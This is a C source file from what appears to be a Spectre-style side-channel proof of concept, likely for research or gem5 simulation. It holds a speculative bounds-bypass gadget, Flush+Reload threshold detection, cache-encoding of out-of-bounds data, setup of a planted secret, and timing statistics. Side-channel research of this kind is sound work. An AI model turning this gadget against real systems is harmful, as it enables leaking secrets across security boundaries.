#include "util.h"

__attribute__((__always_inline__)) void oop(){
    #if defined(__i386__) || defined(__x86_64__)
    if(!true) true++;
    #elif defined(__aarch64__)
        if(true) true++;
    #endif
    JE_64K

    end:
    return;
}

void addOpData(runData *r){
  r->op_times[r->ops++] = (r->end - r->start);
}

void analyseOpData(runData *r, FILE* fptr){
  uint64_t highest = r->op_times[0];
  uint64_t lowest = highest;
  uint64_t sum = 0;
  uint64_t tmp;
  for (int i =0; i < r->ops; i++){
    tmp = r->op_times[i];
    fprintf(fptr,"%u, ", r->op_times[i]);
    sum += tmp;
    if (tmp> highest){
      highest = tmp;
    }
    if (tmp < lowest){
      lowest = tmp;
    }
  }
  #ifndef GEM5_COMPAT
    printf("cycles per byte read:\n -- highest: %7u \n",highest);
    printf(" -- lowest:  %7u \n -- average: %7u \n",lowest,(sum/r->ops));
  #endif
}

float delayed(int x, int len){
  for (int i = 0; i < 1000; i++){}
  return (float)x /  (float)len;
}

__attribute__((__always_inline__)) char access_array(int x) {
  // flushing the data which is used in the condition increases
  // probability of speculation
  size_t len = sizeof(DATA) - 1;
  mfence();
  nospec();
  _mm_sfence();
  flush(&len);
  flush(&x);
  
  // ensure data is flushed at this point
  mfence();
  nospec();
  _mm_sfence();

  // check that only accessible part (DATA) can be accessed
  //! should below be likely or unlikely?
  if(unlikely(((float)x/ (float)len) < 1)) {
    // countermeasure: add the fence here
    cache_encode(data[x]);
  }
}

void setup(memSetup *m){
  if(!CACHE_MISS) 
    CACHE_MISS = detect_flush_reload_threshold();
    
  #ifndef GEM5_COMPAT
    printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n\n", CACHE_MISS);
  #endif


  pagesize = sysconf(_SC_PAGESIZE);
  m->_mem = malloc(pagesize * (256 + 4));
  
  // page aligned
  mem = (char *)(((size_t)m->_mem & ~(pagesize-1)) + pagesize * 2);

  // initialize memory
  memset(mem, 0, pagesize * 256);

  // store secret
  memset(data, ' ', sizeof(data));
  memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
  
  /* for (int i =0; i < 10; i++){
    printf("0x%x: %c\n", &data[0] + i, *(&data[0] + i));
  } */
  // ensure data terminates
  data[sizeof(data) / sizeof(data[0]) - 1] = '0';

  // flush our shared memory
  flush_shared_memory();

  // nothing leaked so far
  memset(m->leaked, ' ', sizeof(m->leaked));
  m->leaked[sizeof(DATA_SECRET)] = 0;
}

